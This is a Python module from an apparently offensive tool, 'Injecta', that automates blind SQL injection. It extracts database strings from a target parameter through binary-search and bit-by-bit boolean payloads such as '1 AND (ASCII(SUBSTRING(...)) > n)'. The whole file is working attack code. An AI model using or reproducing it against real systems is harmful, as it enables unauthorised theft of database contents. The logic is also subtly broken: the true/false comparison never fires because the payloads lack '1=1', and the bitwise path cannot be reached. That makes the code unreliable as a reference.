"""
Injecta — Optimized blind SQL injection with binary search & bit-by-bit extraction
"""
import re
import math
from typing import Any, Callable, Dict, List, Optional, Tuple


class BlindOptimizer:
    def __init__(self, requester, config, logger, payloads, injection_info: Dict[str, Any]):
        self.req = requester
        self.config = config
        self.log = logger
        self.payloads = payloads
        self.info = injection_info
        self.dbms = getattr(payloads, "name", "unknown") if payloads else "unknown"
        self.technique = self.info.get("technique", "boolean") if self.info else "boolean"

    def extract_string(self, url: str, param: str, query: str, max_len: int = 64) -> Optional[str]:
        length = self._get_length(url, param, f"LENGTH(({query}))")
        if length is None or length <= 0:
            return None
        length = min(length, max_len)
        self.log.debug(f"Blind extract: length={length}, technique={self.technique}")

        if self.technique in ("boolean", "error"):
            return self._binary_search_extract(url, param, query, length)
        else:
            return self._bitwise_extract(url, param, query, length)

    def _get_length(self, url: str, param: str, length_query: str) -> Optional[int]:
        if self.technique == "boolean":
            for i in range(1, 256):
                test = f"1 AND ({length_query})={i}"
                if self._boolean_test(url, param, test):
                    return i
        return None

    def _binary_search_extract(self, url: str, param: str, query: str, length: int) -> str:
        result = []
        for pos in range(1, length + 1):
            char = self._binary_search_char(url, param, query, pos)
            if char is None:
                break
            result.append(chr(char))
        return "".join(result)

    def _binary_search_char(self, url: str, param: str, query: str, pos: int) -> Optional[int]:
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            test = f"1 AND (ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid})"
            if self._boolean_test(url, param, test):
                low = mid + 1
            else:
                high = mid - 1
        return low if 32 <= low <= 126 else None

    def _bitwise_extract(self, url: str, param: str, query: str, length: int) -> str:
        result = []
        for pos in range(1, length + 1):
            char_code = 0
            for bit in range(7, -1, -1):
                test = f"1 AND (ASCII(SUBSTRING(({query}), {pos}, 1)) & {1 << bit})={1 << bit}"
                if self._boolean_test(url, param, test):
                    char_code |= (1 << bit)
            result.append(chr(char_code))
        return "".join(result)

    def _boolean_test(self, url: str, param: str, condition: str) -> bool:
        _, resp_text, _ = self.req.test_raw(url, condition, param)
        if not resp_text:
            return False
        # Compare with AND 1=2 version of same condition
        false_cond = condition.replace("1=1", "1=2").replace("'1'='1", "'1'='2")
        if false_cond == condition:
            return True
        _, false_text, _ = self.req.test_raw(url, false_cond, param)
        if not false_text:
            return len(resp_text) > 0
        diff = abs(len(resp_text) - len(false_text))
        return diff > 5 and diff > len(false_text) * 0.03

    def extract_value(self, url: str, param: str, query: str) -> Optional[str]:
        cols = self.info.get("column_count", 1) if self.info else 1
        pos = self.info.get("data_pos", 1) if self.info else 1
        from injecta.enum.extract import extract_clean, MARKER
        results = extract_clean(self.req, url, param, query, cols, pos)
        return results[0] if results else None
